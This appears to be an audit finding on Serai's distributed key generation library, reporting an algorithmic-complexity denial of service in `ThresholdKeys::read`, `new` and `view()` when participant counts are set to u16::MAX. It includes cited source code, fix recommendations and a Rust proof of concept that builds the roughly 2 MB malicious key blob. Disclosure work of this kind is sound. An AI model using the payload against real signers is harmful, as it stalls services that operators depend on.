### Title
Quadratic Lagrange interpolation loop in `ThresholdKeys::new`/`ThresholdView` enables CPU DoS from deserialized keys - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts an attacker-controlled `n` (up to `u16::MAX`) with `Interpolation::Lagrange`. `ThresholdKeys::new` then computes the group key by calling `interpolation_factor` for every participant `1..=t`, and each Lagrange `interpolation_factor` call iterates over the entire `included` set — an O(t²) loop of field multiplications plus one field inversion per participant, triggered by a ~2 MB serialized input.

### Finding Description
The CVE-2018-5252 bug class is a CPU-heavy loop whose cost is disproportionate to the input, reachable from attacker-supplied data. In Serai, the analog lives in `crypto/dkg/src/lib.rs`:

- `ThresholdKeys::read` reads `t`, `n`, `i` as raw `u16`s and selects `Interpolation::Lagrange` purely from a tag byte [1](#0-0) 
- It then reads `n` verification shares and calls `ThresholdKeys::new` [2](#0-1) 
- `ThresholdKeys::new` derives the group key as `sum over i in 1..=t of verification_shares[i] * interpolation_factor(i, 1..=t)` [3](#0-2) 
- `Interpolation::Lagrange::interpolation_factor` loops over every element of `included`, performing two field multiplications per element, and ends with a full field inversion [4](#0-3) 

With `n = t = 65535`, deserialization needs only ~65535 point encodings (~2 MB on a 32-byte curve), but `ThresholdKeys::new` then performs ~4.3 × 10⁹ field multiplications and 65535 inversions — and the same O(len²) cost recurs every time `view()` is called, since `view()` invokes `interpolation_factor` once per included signer [5](#0-4) .

### Impact Explanation
Any code path that feeds untrusted bytes to `ThresholdKeys::read` (key-share exchange, recovery, or backup ingestion) can be stalled for a very long time by a small serialized blob. Each subsequent `view()` call repeats the quadratic Lagrange work, so the victim's signing pipeline can be kept busy indefinitely with repeated small inputs. This is unavailability of the threshold signer reached purely from public/deserialized bytes, matching the Medium-severity algorithmic-complexity DoS class of the report.

### Likelihood Explanation
Exploitation requires only that an attacker can supply serialized `ThresholdKeys` to a target running this library — no keys, collusion, or validator status needed. The trigger is two bytes (`n`, `t` = 0xFFFF) plus the Lagrange tag and `n` syntactically valid points (identity points suffice, since `read_G` accepts them), so crafting the input is trivial. Impact is limited to CPU exhaustion rather than key compromise, keeping severity at Medium.

### Recommendation
- Enforce a sane maximum on `t`/`n` in `ThresholdParams::new` or `ThresholdKeys::read` (real deployments use far fewer than 65535 participants).
- Compute all Lagrange coefficients for the included set in a single O(n) pass (prefix/suffix products with one batched inversion) instead of calling `interpolation_factor` per signer.
- Bound `included` and participant counts in `view()` against the same limit.

### Proof of Concept
```rust
// crypto/dkg/src/lib.rs — conceptual PoC
use std::io::Cursor;
use ciphersuite::Ciphersuite;
use dkg::ThresholdKeys;
use dalek_ff_group::Ed25519; // any Ciphersuite

// Build a serialized ThresholdKeys blob with n = t = u16::MAX, Lagrange interpolation.
fn malicious_blob() -> Vec<u8> {
    let mut buf = vec![];
    buf.extend(&(Ed25519::ID.len() as u32).to_le_bytes());
    buf.extend(Ed25519::ID);
    buf.extend(&u16::MAX.to_le_bytes()); // t
    buf.extend(&u16::MAX.to_le_bytes()); // n
    buf.extend(&1u16.to_le_bytes());     // i = 1
    buf.push(1);                          // Interpolation::Lagrange
    buf.extend(Ed25519::F::ZERO.to_repr().as_ref()); // secret_share
    // n verification shares — identity points are accepted by read_G
    for _ in 0 .. u16::MAX {
        buf.extend(Ed25519::G::identity().to_bytes().as_ref());
    }
    buf
}

// ~2 MB input; ThresholdKeys::new performs ~t^2 field muls + t inversions.
let keys = ThresholdKeys::<Ed25519>::read(&mut Cursor::new(malicious_blob())).unwrap();
// Every view() call repeats the quadratic interpolation work.
let _view = keys.view((1 ..= u16::MAX).map(|i| dkg::Participant::new(i).unwrap()).collect());
```

### Citations

**File:** crypto/dkg/src/lib.rs (L229-246)
```rust
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L500-507)
```rust
    let mut verification_shares = HashMap::with_capacity(included.len());
    for i in &included {
      let verification_share = self.core.verification_shares[i];
      let verification_share = verification_share *
        self.scalar *
        self.core.interpolation.interpolation_factor(*i, &included);
      verification_shares.insert(*i, verification_share);
    }
```

**File:** crypto/dkg/src/lib.rs (L591-616)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };
```

**File:** crypto/dkg/src/lib.rs (L620-632)
```rust
    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
  }
```
